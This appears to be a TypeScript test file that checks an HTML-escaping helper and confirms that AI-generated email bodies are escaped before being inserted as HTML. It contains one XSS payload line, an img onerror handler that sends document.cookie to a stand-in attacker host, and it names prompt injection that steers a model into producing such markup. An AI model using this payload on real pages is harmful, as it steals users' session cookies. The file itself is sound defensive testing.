import { readdirSync, readFileSync } from "node:fs";
import { join } from "node:path";
import { escapeHtml } from "../../../email/templates/base";

const CONFIRM_ACTIONS_DIR = join(__dirname, "..", "confirm-actions");

function confirmActionSources(): string {
  return readdirSync(CONFIRM_ACTIONS_DIR)
    .filter((file) => file.endsWith(".ts") && !file.endsWith(".spec.ts"))
    .map((file) => readFileSync(join(CONFIRM_ACTIONS_DIR, file), "utf8"))
    .join("\n");
}

describe("AI-confirmed email bodies are escaped before they become HTML", () => {
  it("escapes markup a model can be steered into producing", () => {
    const injected = '<img src=x onerror="fetch(\'https://attacker.example/\'+document.cookie)">';
    const escaped = escapeHtml(injected);

    expect(escaped).not.toMatch(/<[a-z]/i);
    expect(escaped).not.toContain('"');
    expect(escaped).toContain("&lt;img");
  });

  it("no AI email path interpolates an unescaped value into an HTML string", () => {
    const source = confirmActionSources();
    const htmlInterpolations = source.match(/<p>\$\{[^}]+\}<\/p>/g) ?? [];

    expect(htmlInterpolations.length).toBeGreaterThan(0);
    for (const fragment of htmlInterpolations)
      expect(fragment).toMatch(/\$\{escapeHtml\(/);
  });
});
